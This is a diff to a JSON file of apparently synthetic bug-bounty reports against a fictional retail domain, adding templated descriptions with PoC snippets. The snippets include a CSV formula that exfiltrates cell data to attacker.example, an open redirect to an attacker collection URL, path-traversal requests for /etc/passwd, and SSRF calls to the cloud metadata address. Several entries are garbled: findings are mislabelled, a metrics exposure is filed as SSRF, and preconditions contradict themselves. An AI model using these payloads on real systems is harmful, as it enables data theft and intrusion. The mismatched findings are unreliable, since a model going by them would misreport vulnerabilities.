+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.zedernfeld-retail.foo/admin/items`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -4817,7 +4853,8 @@
           "offset": "4d 6h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://www.zedernfeld-retail.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: Console 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4957,7 +4994,8 @@
           "offset": "5d 11h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.zedernfeld-retail.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: admin; app version: Auth 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5121,7 +5159,8 @@
           "offset": "6d 20h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://www.zedernfeld-retail.foo/console/queue`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -5245,7 +5284,8 @@
           "offset": "5d 19h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.zedernfeld-retail.foo/fetch`\n- Preconditions: authenticated user: citizen; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5384,7 +5424,8 @@
           "offset": "6d 6h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.zedernfeld-retail.foo/api/import`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5483,7 +5524,8 @@
           "offset": "14h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.zedernfeld-retail.foo/fetch`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5663,7 +5705,8 @@
           "offset": "6d 1h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.zedernfeld-retail.foo/api/v2/documents/`\n- Preconditions: authenticated user: admin; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5791,7 +5834,8 @@
           "offset": "5d 10h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.zedernfeld-retail.foo/statements/`\n- Preconditions: authenticated user: radiologist; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5926,7 +5970,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.zedernfeld-retail.foo/statements/`\n- Preconditions: authenticated user: authenticated user; app version: API 2.3\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6094,7 +6139,8 @@
           "offset": "4d 13h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.zedernfeld-retail.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6204,7 +6250,8 @@
           "offset": "1d 13h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.zedernfeld-retail.foo/v2/me`\n- Preconditions: authenticated user: citizen; app version: Portal 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6367,7 +6414,8 @@
           "offset": "8d 3h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.zedernfeld-retail.foo/export`\n- Preconditions: authenticated user: radiologist; app version: Portal 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6527,7 +6575,8 @@
           "offset": "5d 18h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.zedernfeld-retail.foo/export`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6639,7 +6688,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://payments.zedernfeld-retail.foo/admin/queue`\n- Preconditions: authenticated user: citizen; app version: Portal 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -6779,7 +6829,8 @@
           "offset": "7d 22h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://shop.zedernfeld-retail.foo/api/documents/`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6890,7 +6941,8 @@
           "offset": "1d 11h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://payments.zedernfeld-retail.foo/import`\n- Preconditions: authenticated user: authenticated user; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7028,7 +7080,8 @@
           "offset": "3d 1h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://shop.zedernfeld-retail.foo/metrics`\n- Preconditions: authenticated user: authenticated user; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7147,7 +7200,8 @@
           "offset": "4d 20h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://shop.zedernfeld-retail.foo/api/documents/`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7291,7 +7345,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://payments.zedernfeld-retail.foo/v2/me`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7419,7 +7474,8 @@
           "offset": "3d 16h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://shop.zedernfeld-retail.foo/fetch`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7595,7 +7651,8 @@
           "offset": "7d 6h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://payments.zedernfeld-retail.foo/export?type=records`\n- Preconditions: authenticated user: authenticated user; app version: Portal 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7747,7 +7804,8 @@
           "offset": "4d 19h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://payments.zedernfeld-retail.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7887,7 +7945,8 @@
           "offset": "2d 4h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://payments.zedernfeld-retail.foo/import`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8026,7 +8085,8 @@
           "offset": "7d 3h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://payments.zedernfeld-retail.foo/api/me`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8149,7 +8209,8 @@
           "offset": "7d 17h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://payments.zedernfeld-retail.foo/admin/items`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -8305,7 +8366,8 @@
           "offset": "6d 4h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://shop.zedernfeld-retail.foo/import`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8460,7 +8522,8 @@
           "offset": "4d 11h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://payments.zedernfeld-retail.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8607,7 +8670,8 @@
           "offset": "6d",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://shop.zedernfeld-retail.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: admin; app version: API v2\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8763,7 +8827,8 @@
           "offset": "3d 3h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://shop.zedernfeld-retail.foo/import`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8934,7 +8999,8 @@
           "offset": "4d 19h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://shop.zedernfeld-retail.foo/admin/queue`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -9032,7 +9098,8 @@
           "offset": "5d 2h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
